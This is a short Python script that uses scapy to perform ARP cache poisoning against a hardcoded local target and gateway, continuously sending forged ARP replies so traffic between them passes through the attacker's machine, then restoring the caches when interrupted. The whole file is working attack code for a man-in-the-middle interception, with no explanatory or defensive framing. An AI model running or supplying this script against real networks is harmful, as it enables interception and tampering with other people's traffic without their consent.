from threading import Thread
from scapy.all import *


stop = 1


def ARP_poison(target_ip, gateway_ip, target_mac, gateway_mac, mac):
    print("ARP poisoning...")

    try:
        while stop:
            send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=mac, hwdst=target_mac), verbose=0)
            send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=mac, hwdst=gateway_mac), verbose=0)
    except Exception as e:
        print(str(e))
    finally:
        print("ARP poisoning has ended")


def clean_up(target_ip, gateway_ip, target_mac, gateway_mac):
    print("Cleaning arp cache")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac, hwdst=target_mac),
         verbose=0)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac, hwdst=gateway_mac),
         verbose=0)

arp_poison = Thread(target=ARP_poison, args=("192.168.0.31", "192.168.0.1", "08:00:27:bb:79:98", "24:76:7d:4b:1d:e5", "6c:88:14:be:24:2c"))
arp_poison.start()

try:
    while arp_poison.is_alive():
        time.sleep(1)

except KeyboardInterrupt:
    stop = 0
    clean_up("192.168.0.31", "192.168.0.1", "08:00:27:bb:79:98", "24:76:7d:4b:1d:e5")
